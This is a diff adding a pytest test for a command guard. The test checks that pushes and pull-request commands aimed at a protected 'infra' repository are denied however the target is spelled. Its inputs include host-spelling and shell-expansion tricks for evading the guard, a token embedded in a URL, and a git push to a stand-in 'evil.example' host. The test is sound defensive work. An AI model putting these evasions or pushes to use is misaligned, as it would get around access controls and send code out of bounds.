@@ -147,6 +147,25 @@ def test_factory_repos_lift_a_project_repo_off_the_default_deny_list() -> None:
     assert "Unknown params" in unknown
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git push https://x-access-token:abc@GITHUB.COM/caffeinelabs/infra.git factory/d/x",
+        "gh pr create -R GitHub.com/caffeinelabs/infra --fill",
+        "GH_REPO=GITHUB.COM/caffeinelabs/infra gh pr create --fill",
+        "git push https://github.com./caffeinelabs/infra factory/d/x",
+        "gh pr comment https://www.github.com/caffeinelabs/infra/pull/1 -b x",
+        # Targets it cannot read are denied, not assumed harmless.
+        "R=caffeinelabs/infra; gh pr create -R $R --fill",
+        "git push https://evil.example/caffeinelabs/omnigent factory/d/x",
+    ],
+)
+def test_infra_is_denied_however_its_target_is_spelled(command: str) -> None:
+    """Host case, a root dot, www. and shell expansions do not hide infra from the invariant."""
+    guard = factory_invariants(factory_repos=["caffeinelabs/omnigent"])
+    assert guard(_event(command, _FACTORY_LABELS), {})["result"] == "DENY", command
+
+
 def test_registered_with_validated_params() -> None:
     assert "omnigent.policies.builtins.factory_invariants" in BUILTIN_POLICY_MODULES
     load_registry()
